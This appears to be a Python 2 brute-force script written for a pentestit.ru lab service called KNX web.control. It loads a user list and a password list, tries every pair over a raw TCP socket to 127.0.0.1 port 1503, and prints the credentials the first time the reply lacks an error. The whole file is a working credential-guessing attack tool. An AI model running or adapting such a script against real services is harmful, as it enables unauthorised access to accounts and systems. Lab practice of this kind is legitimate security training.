import socket,sys,datetime,os 

#Timestamp
t = datetime.datetime.now()
ORA = "[%s:%s:%s]" % (t.hour, t.minute, t.second)

#check Parametre
if len(sys.argv) != 3:
     sys.stderr.write(ORA + ' [INFO] Usage: ' + sys.argv[0]+ ' userlist passwordlist\n')
     sys.exit(1)

#LOGO
print ORA + " [INFO] KNX lab.pentestit.ru -- web.control bruter \n"

#Chek list files     
if not os.path.exists(sys.argv[1]):
     sys.stderr.write(ORA + ' [ERROR] userlist was not found\n')
     sys.exit(1)

if not os.path.exists(sys.argv[2]):
     sys.stderr.write(ORA + ' [ERROR] passwordlist was not found\n')
     sys.exit(1)

else:
     print ORA + " [INFO] Loading your lists...\n"
     
#Read and split userfile
userfile = open(sys.argv[1], "r")
users = userfile.readlines()
userfile.close()

#Read and split passfile
passfile = open(sys.argv[2], "r")
passwords = passfile.readlines()
passfile.close()

i = 1
tot = users.__len__() * passwords.__len__()
print ORA + " [INFO] Total Tries: " + str(tot) + "\n"


#BRUTER
for user in users:
    for password in passwords:  
        #Connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 1503))
        except:
            print ORA + " [ERROR] Connection not possible\n"
        
        print ORA + " [INFO] Trying %i di %i - %s:%s" %(i,tot,user.strip(),password.strip())
        #Request username
        s.recv(1024)

        #Envia Username
        s.send(user.strip())

        #Request password
        s.recv(1024)

        #Send Password
        s.send(password.strip())

        #Credential results
        risposta = s.recv(1024)
        if "Error!" not in risposta:
            print ORA + " [BINGO!] Username: %s Password: %s" %(user.strip(),password.strip())
            sys.exit(1)
        i = i +1 
        s.close()
